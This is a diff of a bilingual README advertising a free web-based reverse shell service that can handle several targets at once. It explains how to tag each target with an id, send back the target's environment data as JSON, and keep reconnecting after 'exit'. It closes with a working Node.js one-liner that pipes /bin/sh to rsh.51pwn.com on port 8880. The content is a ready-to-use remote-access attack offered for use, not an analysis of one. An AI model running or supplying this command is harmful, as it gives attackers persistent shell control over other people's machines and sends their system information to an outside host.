@@ -1,13 +1,17 @@
 # 免费的 web reverse shell
-* 1 setYourId: xxxx_001 
-** 当然你可以设置只有你知道的字符串
-** 必须在 reverse shell 中输出给 server，便于关联
-** 新的特性： 可以若干个 目标同时 reverse shell 到 web浏览器
+![xx](https://github.com/hktalent/51Pwn-Platform/assets/18223385/d2d503a6-7fed-428b-8cec-6ef78af2adb7)
+
+* 1 one id Multi-target concurrency reverse shell
+* 2 setYourId: xxxx_001 
+** The id must be sent to the server as soon as the reverse shell connects to the server to facilitate association with your web.（id 必须在reverse shell连接服务器后第一时间发送给服务器，便于和你的web进行关联）
+** awesome： It is no longer a simple nc -lnvtp xxx, but can accept several target reverse shells at the same time.（他不再是简单的nc -lnvtp xxx，而是可以同时接受若干目标reverse shell）
 
 * 2 start your reverse shell
-  *** 第一行发给 server，告诉server 你关联的id：xxxx_001
-  *** 第二行是一个json 数据，通常可以用来收集目标的环境信息，反馈给server
-  注意下面的命令当你输入 exit 则不会重新连接到服务器
+  *** id is a unique identification and association between you and all reverse shell targets（id 是 唯一标识、关联你与所有reverse shell 目标之前的关联、关系）
+  *** The second line is a json data, which can usually be used to collect the target's environment information and feed it back to the server. Of course you can give feedback {}。
+  第二行是一个json 数据，通常可以用来收集目标的环境信息，反馈给server。当然你可以反馈一个空的{}
+Note: A good reverse shell will keep reconnecting to the server even if you type exit
+  注意：一个优秀的reverse shell会吃重要，即便你输入 exit 也会不断重新连接到服务器
 ```
 node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("xxxx_001\n");client.write("{}\n") }); return /a/;})();'
 ```
